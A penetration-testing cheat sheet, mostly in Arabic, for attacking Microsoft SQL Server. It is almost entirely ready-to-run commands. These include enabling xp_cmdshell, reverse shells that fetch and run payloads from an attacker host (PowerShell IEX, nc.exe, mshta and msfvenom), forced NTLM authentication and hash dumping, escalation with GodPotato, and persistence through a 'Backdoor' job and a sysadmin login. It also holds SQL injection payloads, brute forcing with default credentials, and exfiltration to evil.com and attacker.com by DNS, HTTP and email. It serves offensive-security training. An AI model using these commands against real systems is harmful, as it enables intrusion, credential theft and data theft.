# 🟥 MSSQL — Full Penetration Testing Cheat Sheet
> **Port:** 1433/tcp (MSSQL) | 1434/udp (SQL Browser)  
> **Auth Types:** Windows Auth (NTLM/Kerberos) | SQL Auth (sa / custom users)

---

## 📋 جدول المحتويات

1. [الاتصال والوصول](#1-الاتصال-والوصول)
2. [Nmap Enumeration](#2-nmap-enumeration)
3. [الاستكشاف الأساسي](#3-الاستكشاف-الأساسي)
4. [قواعد البيانات والجداول](#4-قواعد-البيانات-والجداول)
5. [المستخدمون والصلاحيات](#5-المستخدمون-والصلاحيات)
6. [تنفيذ الأوامر — xp_cmdshell](#6-تنفيذ-الأوامر--xp_cmdshell)
7. [تنفيذ الأوامر — CLR Assembly](#7-تنفيذ-الأوامر--clr-assembly)
8. [تنفيذ الأوامر — External Scripts](#8-تنفيذ-الأوامر--external-scripts-python--r)
9. [Linked Servers — Lateral Movement](#9-linked-servers--lateral-movement)
10. [NTLM Hash Capture](#10-ntlm-hash-capture)
11. [استخراج الهاشات](#11-استخراج-الهاشات)
12. [قراءة وكتابة الملفات](#12-قراءة-وكتابة-الملفات)
13. [Privilege Escalation](#13-privilege-escalation)
14. [Persistence](#14-persistence)
15. [SQL Injection Payloads](#15-sql-injection-payloads)
16. [Brute Force](#16-brute-force)
17. [Metasploit Modules](#17-metasploit-modules)
18. [PowerUpSQL](#18-powerupsql)
19. [Kill Chain & Decision Flow](#19-kill-chain--decision-flow)
20. [مقارنة طرق التنفيذ](#20-مقارنة-طرق-التنفيذ)
21. [مرجع sys views](#21-مرجع-sys-views)
22. [ملفات الإخراج — أولويات السكربت](#22-ملفات-الإخراج--أولويات-السكربت)
23. [أدوات التثبيت](#23-أدوات-التثبيت)

---

## 1. الاتصال والوصول

### Impacket — mssqlclient.py ⭐ (الأفضل)

```bash
# SQL Authentication
impacket-mssqlclient sa:password@192.168.1.10
impacket-mssqlclient sa:@192.168.1.10 -port 1433          # كلمة مرور فارغة

# Windows Authentication
impacket-mssqlclient DOMAIN/user:password@192.168.1.10 -windows-auth

# Pass-the-Hash
impacket-mssqlclient user@192.168.1.10 -hashes :NTLMHASH

# Kerberos
impacket-mssqlclient DOMAIN/user@192.168.1.10 -k -no-pass

# قاعدة بيانات محددة
impacket-mssqlclient user:password@192.168.1.10 -db master
```

**Built-in helpers داخل mssqlclient:**
```
SQL> enable_xp_cmdshell      # تفعيل xp_cmdshell
SQL> disable_xp_cmdshell     # تعطيل
SQL> xp_cmdshell whoami      # تنفيذ أمر
SQL> enum_logins             # عرض كل logins
SQL> enum_impersonate        # فحص impersonation
SQL> enum_links              # عرض linked servers
```

---

### sqlcmd (Windows)

```bash
# اتصال محلي
sqlcmd -S localhost -U sa -P Password123

# مع تحديد المنفذ
sqlcmd -S 192.168.1.10,1433 -U sa -P Password123

# Windows Authentication
sqlcmd -S 192.168.1.10 -E

# تنفيذ استعلام مباشر
sqlcmd -S 192.168.1.10 -U sa -P Password123 -Q "SELECT @@version"

# تنفيذ سكريبت من ملف
sqlcmd -S 192.168.1.10 -U sa -P Password123 -i script.sql

# CSV Export
sqlcmd -S server -U user -P pass -Q "SET NOCOUNT ON; SELECT * FROM table" -h-1 -s ',' -W
```

**خيارات sqlcmd المهمة:**
```
-X          بدون startup scripts
-h-1        بدون headers
-s ','      تحديد delimiter
-W          إزالة المسافات الزائدة
-i file.sql تنفيذ ملف
```

> ⚠️ كل استعلام في sqlcmd ينتهي بـ `GO` | mssqlclient.py لا يحتاج `GO`

---

### sqsh (Linux)

```bash
sqsh -S 192.168.1.10:1433 -U sa -P Password123
sqsh -S 192.168.1.10 -U DOMAIN\\user -P password
sqsh -S 192.168.1.10 -U sa -P Password123 -D master      # قاعدة بيانات محددة
```

---

### NetExec / CrackMapExec

```bash
# فحص الاتصال
nxc mssql 192.168.1.10 -u sa -p Password123

# تنفيذ أمر CMD
nxc mssql 192.168.1.10 -u sa -p Password123 -x "whoami"

# تنفيذ PowerShell
nxc mssql 192.168.1.10 -u sa -p Password123 -X '$PSVersionTable'

# Windows Auth
nxc mssql 192.168.1.10 -u administrator -p password -d DOMAIN -x "whoami"

# Brute Force
nxc mssql 192.168.1.10 -u users.txt -p passwords.txt
```

---

## 2. Nmap Enumeration

```bash
# Full MSSQL scan
nmap -p 1433 -sV \
  --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,\
ms-sql-config,ms-sql-ntlm-info,ms-sql-dac,ms-sql-dump-hashes,\
ms-sql-query,ms-sql-tables,ms-sql-hasdbaccess \
  --script-args mssql.instance-port=1433,mssql.username=sa,\
mssql.password=,mssql.instance-name=MSSQLSERVER \
  192.168.1.10

# SQL Browser (UDP)
nmap -sU -p 1434 --script ms-sql-discover 192.168.1.10

# فحص كلمات سر فارغة فقط
nmap -p 1433 --script ms-sql-empty-password 192.168.1.10

# Dump hashes مع credentials
nmap -p 1433 --script ms-sql-dump-hashes \
  --script-args mssql.username=sa,mssql.password=Password123 192.168.1.10
```

### قراءة نتائج Nmap

| Script | ما يكشفه | الأولوية |
|--------|----------|----------|
| `ms-sql-info` | الإصدار + instance name + hostname | ⭐⭐⭐ |
| `ms-sql-empty-password` | يجرب sa بكلمة مرور فارغة | 🚨 RCE محتملة |
| `ms-sql-ntlm-info` | domain + hostname (بيئة AD) | ⭐⭐⭐ |
| `ms-sql-xp-cmdshell` | هل xp_cmdshell مفعّل | 🚨 RCE جاهزة |
| `ms-sql-dump-hashes` | password hashes | 🚨 crack offline |
| `ms-sql-config` | إعدادات الـ server | ⭐⭐ |
| `ms-sql-dac` | Dedicated Admin Connection | ⚠️ |
| `ms-sql-tables` | قائمة الجداول | ⭐⭐ |

---

## 3. الاستكشاف الأساسي

### معلومات النسخة والسيرفر

```sql
SELECT @@version;
SELECT SERVERPROPERTY('ProductVersion');
SELECT SERVERPROPERTY('ProductLevel');
SELECT SERVERPROPERTY('Edition');
SELECT @@SERVERNAME;
SELECT SERVERPROPERTY('MachineName');
GO
```

### السياق الحالي

```sql
SELECT SYSTEM_USER;        -- Login الحالي (مستوى السيرفر)
SELECT CURRENT_USER;       -- User الحالي (مستوى DB)
SELECT USER_NAME();
SELECT DB_NAME();          -- قاعدة البيانات الحالية
GO
```

---

## 4. قواعد البيانات والجداول

### قواعد البيانات

```sql
-- عرض كل قواعد البيانات
SELECT name FROM sys.databases;
SELECT name FROM master..sysdatabases;
SELECT name, database_id, create_date FROM sys.databases;
EXEC sp_helpdb;
GO

-- تبديل قاعدة البيانات
USE database_name;
GO
```

### الجداول

```sql
-- جداول قاعدة البيانات الحالية
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
SELECT name FROM sysobjects WHERE xtype='U';

-- جداول قاعدة بيانات محددة
SELECT table_name FROM [TestDB].[INFORMATION_SCHEMA].[TABLES]
WHERE table_type = 'BASE TABLE';
GO
```

### الأعمدة

```sql
-- أعمدة جدول معين
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_name='users';

-- البحث عن أعمدة passwords
SELECT table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%secret%';
GO
```

### قراءة البيانات

```sql
SELECT * FROM table_name;
SELECT COUNT(*) FROM table_name;
SELECT * FROM table_name WHERE column LIKE '%admin%';
GO
```

---

## 5. المستخدمون والصلاحيات

### عرض المستخدمين

```sql
-- Server-level logins (الأهم)
SELECT name FROM sys.server_principals;
SELECT name FROM master.sys.syslogins;

-- Database-level users
SELECT name FROM sys.database_principals;
SELECT name FROM sysusers;
GO
```

### فحص الصلاحيات

```sql
-- هل أنا sysadmin؟
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 1 = نعم ← RCE ممكنة | 0 = لا

-- من هم sysadmins؟
SELECT name FROM sys.server_principals
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- صلاحياتي الكاملة
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

-- Server Roles
SELECT name FROM sys.server_principals WHERE type='R';

-- Database Roles
EXEC sp_helprolemember;
GO
```

> **مرجع sys views:**
> - `sys.server_principals` → من يدخل السيرفر (Authentication)
> - `sys.database_principals` → من يملك صلاحيات داخل DB (Authorization)
> - `sysusers` → Legacy view لنفس database_principals

---

## 6. تنفيذ الأوامر — xp_cmdshell

### التحقق والتفعيل

```sql
-- التحقق من الحالة
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
EXEC sp_configure 'xp_cmdshell';
GO

-- التفعيل (يتطلب sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO

-- One-liner
EXEC sp_configure 'Show Advanced Options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
GO
```

### تنفيذ الأوامر

```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\root.txt';
EXEC master..xp_cmdshell 'whoami';
GO
```

### Bypass xp_cmdshell إذا كان محجوباً

```sql
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'whoami'--
```

### Reverse Shell عبر PowerShell

```bash
# على Kali — تشفير الـ payload
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/shell.ps1")' \
  | iconv -t utf-16le | base64 -w 0
```

```sql
-- تنفيذ الـ payload المشفّر
EXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD_HERE';

-- تحميل وتشغيل reverse shell
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/nc.exe -OutFile C:\Users\Public\nc.exe"';
EXEC xp_cmdshell 'C:\Users\Public\nc.exe -e cmd.exe 10.10.14.5 4444';

-- Download & Execute مباشرة
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/rev.ps1") | powershell -noprofile';

-- مع HTA
EXEC xp_cmdshell 'mshta http://10.10.14.5/shell.hta';
GO
```

```bash
# Kali — إنشاء HTA payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f hta-psh > shell.hta
python3 -m http.server 80
```

---

## 7. تنفيذ الأوامر — CLR Assembly

### التحقق والتفعيل

```sql
-- فحص CLR Integration
SELECT * FROM sys.configurations WHERE name = 'clr enabled';

-- فحص Trustworthy
SELECT name, is_trustworthy_on FROM sys.databases;

-- التفعيل
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
USE msdb;
ALTER DATABASE msdb SET TRUSTWORTHY ON;
GO
```

### PowerUpSQL — CLR

```powershell
# تفعيل CLR وتنفيذ أمر
Invoke-SQLOSCmdCLR -Username sa -Password Password123 -Instance SERVER\INSTANCE -Command "whoami" -Verbose

# إنشاء ملفات CLR يدوياً
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Temp -Verbose
# ينشئ: runcmd.cs | runcmd.dll | runcmd.txt (SQL commands)
```

### Metasploit CLR

```bash
use exploit/windows/mssql/mssql_clr_payload
set RHOSTS 192.168.1.10
set USERNAME sa
set PASSWORD Password123
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
exploit
```

---

## 8. تنفيذ الأوامر — External Scripts (Python & R)

```sql
-- التحقق
EXEC sp_configure 'external scripts enabled';

-- التفعيل
EXEC sp_configure 'external scripts enabled', 1;
RECONFIGURE;
GO

-- Python — تنفيذ أمر
EXEC sp_execute_external_script
    @language = N'Python',
    @script = N'print(__import__("os").system("whoami"))';

-- Python — قراءة ملف
EXEC sp_execute_external_script
    @language = N'Python',
    @script = N'print(open("C:\\\\Windows\\\\win.ini", "r").read())';

-- R — تنفيذ أمر
EXEC sp_execute_external_script
    @language=N'R',
    @script=N'OutputDataSet <- data.frame(system("cmd.exe /c whoami",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO
```

---

## 9. Linked Servers — Lateral Movement

### الاستكشاف

```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
SELECT name FROM sys.servers WHERE is_linked = 1;
GO

-- اختبار الاتصال
SELECT * FROM OPENQUERY([LinkedServer], 'SELECT @@version');
GO
```

### تنفيذ الأوامر عبر Linked Server

```sql
-- استعلام عادي
EXEC ('SELECT @@version') AT [LinkedServer];

-- تفعيل xp_cmdshell على linked server
EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [LinkedServer];

-- تنفيذ أمر
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];

-- Double hop
EXEC ('EXEC (''SELECT @@version'') AT [Server2]') AT [Server1];

-- تفعيل RPC out
EXEC sp_serveroption 'LinkedServer','rpc out','true';
GO
```

### PowerUpSQL — Linked Servers

```powershell
# استكشاف
Get-SQLServerLinkCrawl -Instance SERVER\INSTANCE | ft

# تنفيذ أمر عبر linked servers
Get-SQLServerLinkCrawl -Instance SERVER\INSTANCE -Query 'EXEC xp_cmdshell "whoami"' | ft
```

---

## 10. NTLM Hash Capture

### إجبار المصادقة (UNC Path Injection)

```sql
-- xp_dirtree (الأكثر شيوعاً)
EXEC xp_dirtree '\\10.10.14.5\share';

-- xp_fileexist
EXEC xp_fileexist '\\10.10.14.5\share\test';

-- xp_subdirs
EXEC master..xp_subdirs '\\10.10.14.5\share';

-- OPENROWSET
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=\\10.10.14.5\share', '');

-- Out-of-Band مع بيانات
DECLARE @x varchar(100);
SELECT @x=name FROM master..sysdatabases WHERE database_id=1;
EXEC('xp_dirtree "\\\\10.10.14.5\\' + @x + '"');
GO
```

### OLE Automation — HTTP Coercion

```sql
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @o INT;
EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1', @o OUT;
EXEC sp_OAMethod @o, 'open', NULL, 'GET', 'http://10.10.14.5', 'false';
EXEC sp_OAMethod @o, 'SetAutoLogonPolicy', NULL, 0;
EXEC sp_OAMethod @o, 'send';
EXEC sp_OADestroy @o;
GO
```

### على Kali — استقبال الـ Hash

```bash
# Responder
sudo responder -I tun0 -v

# أو SMB Server
sudo impacket-smbserver share . -smb2support

# Crack NetNTLMv2
hashcat -m 5600 hash.txt rockyou.txt
```

---

## 11. استخراج الهاشات

```sql
-- MSSQL 2005+
SELECT name, password_hash FROM sys.sql_logins;
SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM sys.sql_logins;

-- عرض مباشر
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash)
FROM master.sys.sql_logins;

-- MSSQL 2000 (قديم)
SELECT name, password FROM master..sysxlogins;
GO
```

### Crack

```bash
# MSSQL 2005+
hashcat -m 1731 hashes.txt rockyou.txt

# MSSQL 2000
hashcat -m 131 hashes.txt rockyou.txt
```

---

## 12. قراءة وكتابة الملفات

### قراءة الملفات

```sql
-- OPENROWSET BULK (الأنظف)
SELECT * FROM OPENROWSET(
    BULK 'C:\Windows\System32\drivers\etc\hosts',
    SINGLE_CLOB
) AS f;

-- xp_cmdshell
EXEC xp_cmdshell 'type C:\Windows\win.ini';

-- عرض مجلد
EXEC master..xp_dirtree 'C:\', 1, 1;

-- التحقق من وجود ملف
EXEC master..xp_fileexist 'C:\Windows\win.ini';

-- BULK INSERT (يتطلب إنشاء جدول)
CREATE TABLE tmp(data VARCHAR(MAX));
BULK INSERT tmp FROM 'C:\Users\Administrator\Desktop\root.txt'
WITH (ROWTERMINATOR = '\n');
SELECT * FROM tmp;
DROP TABLE tmp;
GO
```

### كتابة الملفات

```sql
-- echo
EXEC xp_cmdshell 'echo test > C:\Temp\test.txt';

-- BCP Export
EXEC xp_cmdshell 'bcp "SELECT * FROM db.dbo.users" queryout C:\users.txt -c -T';

-- نسخ ملف
EXEC xp_cmdshell 'copy C:\source.txt C:\dest.txt';
GO
```

---

## 13. Privilege Escalation

### Impersonation (انتحال الهوية)

```sql
-- من يمكن انتحال هويته؟
SELECT DISTINCT b.name
FROM sys.server_permissions a
JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- انتحال هوية sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
-- لو طلع 1 → أنت الآن sysadmin

-- العودة للهوية الأصلية
REVERT;
GO
```

### TRUSTWORTHY Database Abuse

```sql
-- البحث عن databases بها TRUSTWORTHY مفعّل
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on=1;

-- تفعيله (يتطلب sysadmin)
ALTER DATABASE targetDB SET TRUSTWORTHY ON;
GO
-- ثم db_owner → يمكن التصعيد لـ sysadmin عبر CLR
```

### SeImpersonatePrivilege

```sql
-- فحص الامتيازات
EXEC xp_cmdshell 'whoami /priv';
```

> إذا ظهر **SeImpersonatePrivilege** → استخدم **GodPotato** أو **PrintSpoofer**

```bash
# GodPotato
EXEC xp_cmdshell 'C:\Temp\GodPotato.exe -cmd "cmd /c whoami"';
EXEC xp_cmdshell 'C:\Temp\GodPotato.exe -cmd "cmd /c nc.exe 10.10.14.5 4444 -e cmd"';
```

### جدول مسارات التصعيد

| المسار | المتطلب |
|--------|---------|
| xp_cmdshell | sysadmin |
| Impersonation | IMPERSONATE permission |
| TRUSTWORTHY DB | db_owner |
| Linked Server | RPC out enabled |
| xp_dirtree NTLM | أي مستخدم |
| SeImpersonatePrivilege | service account |

---

## 14. Persistence

### SQL Agent Job

```sql
USE msdb;
EXEC sp_add_job @job_name = 'Backdoor';
EXEC sp_add_jobstep
    @job_name = 'Backdoor',
    @step_name = 'Execute',
    @subsystem = 'CMDEXEC',
    @command = 'powershell -enc <BASE64_PAYLOAD>';
EXEC sp_add_schedule @schedule_name = 'Daily', @freq_type = 4;
EXEC sp_attach_schedule @job_name = 'Backdoor', @schedule_name = 'Daily';
GO
```

### Backdoor Login

```sql
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123!';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
GO
```

### Read-Only User (للـ Enumeration لاحقاً)

```sql
USE master;
CREATE LOGIN readonly_user WITH PASSWORD='P@ssw0rd!',
    DEFAULT_DATABASE=TestDB,
    CHECK_EXPIRATION=OFF,
    CHECK_POLICY=OFF;
GO
USE TestDB;
CREATE USER readonly_user FOR LOGIN readonly_user;
EXEC sp_addrolemember N'db_datareader', N'readonly_user';
GO
```

---

## 15. SQL Injection Payloads

### UNION-Based

```sql
' UNION SELECT NULL,@@version--
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password FROM users--
```

### Error-Based (CONVERT)

```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,DB_NAME())--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

### Boolean Blind

```sql
1 AND LEN(@@version)>5--
1 AND ASCII(LOWER(SUBSTRING((@@version),1,1)))>97--
1 AND ASCII(LOWER(SUBSTRING((DB_NAME()),1,1)))>97--
```

### Time-Based

```sql
'; WAITFOR DELAY '00:00:05'--
1; IF LEN(@@version)>5 WAITFOR DELAY '00:00:10'--
1; IF ASCII(LOWER(SUBSTRING((@@version),1,1)))>97 WAITFOR DELAY '00:00:05'--
ProductID=1'; WAITFOR DELAY '00:00:10'--
```

### Stacked Queries — Command Execution

```sql
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

-- SQLi لتنفيذ reverse shell
test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://10.10.14.5/shell.ps1'')"';--
```

---

## 16. Brute Force

```bash
# Hydra
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://192.168.1.10

# Medusa
medusa -h 192.168.1.10 -u sa -P rockyou.txt -M mssql

# NetExec
nxc mssql 192.168.1.10 -u users.txt -p passwords.txt

# Nmap
nmap -p 1433 --script ms-sql-brute \
  --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.10
```

### Default Credentials — جرّبها أولاً

| Username | Password |
|----------|----------|
| sa | (empty) |
| sa | sa |
| sa | password |
| sa | Password123 |
| sa | P@ssw0rd |
| admin | admin |
| MSSQLSERVER | MSSQLSERVER |

---

## 17. Metasploit Modules

```bash
# Scanners
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login

# Enumeration
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_sql

# Exploitation
use exploit/windows/mssql/mssql_payload
use exploit/windows/mssql/mssql_clr_payload
use exploit/windows/mssql/mssql_linkcrawler

# CVE-2020-0618 (SSRS RCE)
use exploit/windows/mssql/mssql_reporting_services
```

---

## 18. PowerUpSQL

```powershell
# تحميل
git clone https://github.com/NetSPI/PowerUpSQL
Import-Module .\PowerUpSQL.ps1

# استكشاف
Get-SQLInstanceDomain
Get-SQLServerInfo -Instance SERVER\INSTANCE
Get-SQLServerLinkCrawl -Instance SERVER\INSTANCE | ft

# Audit شامل
Invoke-SQLAudit -Verbose -Instance SERVER\INSTANCE

# تنفيذ أمر
Invoke-SQLOSCmd -Instance SERVER\INSTANCE -Command "whoami"

# CLR
Invoke-SQLOSCmdCLR -Username sa -Password Password123 -Instance SERVER\INSTANCE -Command "whoami" -Verbose
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Temp -Verbose

# DLL Extended SP
Create-SQLFileXpDll -OutFile C:\xp_evil.dll -Command "whoami" -ExportName xp_evil
```

---

## 19. Kill Chain & Decision Flow

```
1433/tcp open
         │
         ▼
    Nmap Scripts
         │
    ┌────┴─────────────┐
    │                  │
ms-sql-empty-password  ms-sql-ntlm-info
نجح؟                   كشف domain؟
    │                  │
   ↓ YES              ↓ YES
  sa : (empty)      بيئة AD → جرّب Windows Auth
  ← RCE مباشرة
         │
         ▼
  Authentication
  (SQL / Windows / Pass-the-Hash / Kerberos)
         │
         ▼
  Enumeration
  DBs → Tables → Users → Roles
         │
         ▼
  IS_SRVROLEMEMBER('sysadmin') = ?
    ┌────┴────────────────────┐
    │ = 1                     │ = 0
    ▼                         ▼
Enable xp_cmdshell         Impersonation?
    │                      TRUSTWORTHY?
    ▼                      Linked Server?
  xp_cmdshell 'whoami'          │
    │                           ▼
    ▼                    Escalate → sysadmin
  Reverse Shell
    │
    ▼
  whoami /priv
    │
  SeImpersonatePrivilege?
    │ YES
    ▼
  GodPotato → SYSTEM
    │
    ▼
  Credential Dump (secretsdump / mimikatz)
    │
    ▼
  Lateral Movement (Linked Servers / AD)
```

### متى أوقف + متى أكمل

| الحالة | القرار |
|--------|--------|
| sa بكلمة مرور فارغة/بسيطة | 🚨 RCE مباشرة |
| xp_cmdshell مفعّل | 🚨 `EXEC xp_cmdshell 'whoami'` |
| IS_SRVROLEMEMBER = 1 | 🚨 فعّل xp_cmdshell |
| Linked Servers طلعت | 🚨 Lateral movement |
| SeImpersonatePrivilege | 🚨 GodPotato / PrintSpoofer |
| ما في credentials | ✅ انتقل للخدمة الثانية |
| حصلت credentials من AD لاحقاً | ⚠️ ارجع جرّب Windows Auth |

---

## 20. مقارنة طرق التنفيذ

| الطريقة | المتطلبات | الوضوح | الفعالية |
|---------|----------|--------|----------|
| xp_cmdshell | sysadmin | عالي 🔴 | عالية ⭐⭐⭐ |
| CLR Assembly | db_owner + TRUSTWORTHY | منخفض 🟢 | عالية ⭐⭐⭐ |
| External Scripts | external scripts enabled | متوسط 🟡 | متوسطة ⭐⭐ |
| Linked Servers | RPC out enabled | منخفض 🟢 | عالية ⭐⭐⭐ |
| Extended SP (DLL) | sysadmin + UNC path | متوسط 🟡 | متوسطة ⭐⭐ |
| SQL Injection | web app | متوسط 🟡 | عالية ⭐⭐⭐ |

---

## 21. مرجع sys views

| View | المستوى | ما يحتوي |
|------|---------|---------|
| `sys.server_principals` | Server | SQL logins + Windows logins + Server roles |
| `sys.database_principals` | Database | DB users + DB roles |
| `sys.sql_logins` | Server | SQL logins مع password_hash |
| `sys.databases` | Server | كل قواعد البيانات |
| `sys.servers` | Server | Linked servers |
| `sys.configurations` | Server | إعدادات السيرفر (xp_cmdshell, CLR...) |
| `sys.objects` | Database | الكائنات (tables, procedures...) |
| `sysusers` | Database | Legacy — DB users |
| `information_schema.tables` | Database | جداول قاعدة البيانات |
| `information_schema.columns` | Database | أعمدة الجداول |

---

## 22. ملفات الإخراج — أولويات السكربت

| الملف | المحتوى | الأولوية |
|-------|---------|---------|
| `nmap_mssql_scripts.txt` | كل nmap scripts | ⭐⭐⭐ |
| `valid_credentials.txt` | credentials صالحة | ⭐⭐⭐ |
| `xp_cmdshell_status.txt` | هل RCE ممكنة | ⭐⭐⭐ |
| `is_sysadmin.txt` | مستوى الصلاحية | ⭐⭐⭐ |
| `linked_servers.txt` | lateral movement paths | ⭐⭐⭐ |
| `databases.txt` | قائمة الـ databases | ⭐⭐⭐ |
| `tables.txt` | جداول تحتوي data | ⭐⭐ |
| `users.txt` | SQL users | ⭐⭐ |
| `mssql_version.txt` | الإصدار | ⭐⭐ |
| `SUMMARY.txt` | ملخص كامل | ⭐⭐ |

---

## 23. أدوات التثبيت

```bash
# nmap
sudo apt install -y nmap

# sqsh
sudo apt install -y sqsh

# Impacket (mssqlclient.py)
pip3 install impacket --break-system-packages
# أو:
sudo apt install -y python3-impacket

# NetExec
pip3 install netexec --break-system-packages

# mssql-cli
pip3 install mssql-cli --break-system-packages

# sqlcmd (Linux)
curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -
sudo apt install -y mssql-tools

# Responder
sudo apt install -y responder

# PowerUpSQL
git clone https://github.com/NetSPI/PowerUpSQL
```










## 24. OLE Automation — قراءة Registry وData Exfiltration

sql

```sql
-- تفعيل OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
GO

-- قراءة Registry
DECLARE @shell INT, @value VARCHAR(255);
EXEC sp_OACreate 'WScript.Shell', @shell OUT;
EXEC sp_OAMethod @shell, 'RegRead', @value OUT,
     'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName';
SELECT @value;
EXEC sp_OADestroy @shell;
GO

-- HTTP GET لـ Data Exfiltration
DECLARE @o INT, @ret INT;
EXEC sp_OACreate 'MSXML2.XMLHTTP', @o OUT;
EXEC sp_OAMethod @o, 'open', NULL, 'GET',
     'http://10.10.14.5/?data='+SYSTEM_USER, 'false';
EXEC sp_OAMethod @o, 'send';
EXEC sp_OADestroy @o;
GO
```

---

## 25. Database Mail — Data Exfiltration

sql

```sql
-- فحص إذا Database Mail مفعّل
SELECT is_broker_enabled FROM sys.databases WHERE name='msdb';

-- إرسال بيانات عبر Email
EXEC msdb.dbo.sp_send_dbmail
    @profile_name = 'Default',
    @recipients = 'attacker@evil.com',
    @subject = 'data',
    @body = 'test',
    @query = 'SELECT name, password_hash FROM sys.sql_logins';
GO
```

---

## 26. SeBackupPrivilege / SeRestorePrivilege

sql

```sql
-- فحص الامتيازات
EXEC xp_cmdshell 'whoami /priv';
```

> إذا ظهر **SeBackupPrivilege** أو **SeRestorePrivilege**:

bash

```sql
# نسخ SAM و SYSTEM
EXEC xp_cmdshell 'reg save HKLM\SAM C:\Temp\SAM';
EXEC xp_cmdshell 'reg save HKLM\SYSTEM C:\Temp\SYSTEM';
```


```bash
# على Kali — استخراج الهاشات
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

|الامتياز|الاستغلال|
|---|---|
|SeBackupPrivilege|قراءة أي ملف بغض النظر عن الصلاحيات|
|SeRestorePrivilege|كتابة أي ملف → استبدال ملفات النظام|
|SeImpersonatePrivilege|GodPotato / PrintSpoofer|
|SeTakeOwnershipPrivilege|تملّك أي ملف/مجلد|

---

## 27. Advanced SQL Injection — Out-of-Band Exfiltration

sql

```sql
-- استخراج البيانات عبر DNS (OOB SQLi)
DECLARE @data VARCHAR(1024);
SELECT @data = (SELECT TOP 1 name FROM sys.databases);
EXEC('master..xp_dirtree "\\\\'+@data+'.attacker.com\\share"');
GO

-- استخراج عبر HTTP error
DECLARE @q VARCHAR(1000);
SET @q = 'SELECT * FROM OPENROWSET(''SQLNCLI'',
''Server=\\'+SYSTEM_USER+'.attacker.com\share'','''')';
EXEC(@q);
GO
```

---

## 28. SQLRecon (بديل حديث لـ PowerUpSQL)

powershell

```powershell
# تحميل
git clone https://github.com/skahwah/SQLRecon

# استكشاف
SQLRecon.exe /enum:sqlspns
SQLRecon.exe /a:Windows /h:server /m:info

# Linked Servers
SQLRecon.exe /a:Windows /h:server /m:links

# تنفيذ أمر
SQLRecon.exe /a:Windows /h:server /m:xpcmd /c:whoami

# CLR
SQLRecon.exe /a:Windows /h:server /m:clr /dll:C:\evil.dll /function:run
```
---

## 🔖 Quick Reference

| الأمر | الوصف |
|-------|-------|
| `SELECT @@version;` | نسخة SQL Server |
| `SELECT DB_NAME();` | قاعدة البيانات الحالية |
| `SELECT SYSTEM_USER;` | Login الحالي |
| `SELECT IS_SRVROLEMEMBER('sysadmin');` | هل أنا sysadmin؟ |
| `EXEC sp_linkedservers;` | عرض linked servers |
| `EXEC xp_cmdshell 'whoami';` | تنفيذ أمر نظام |
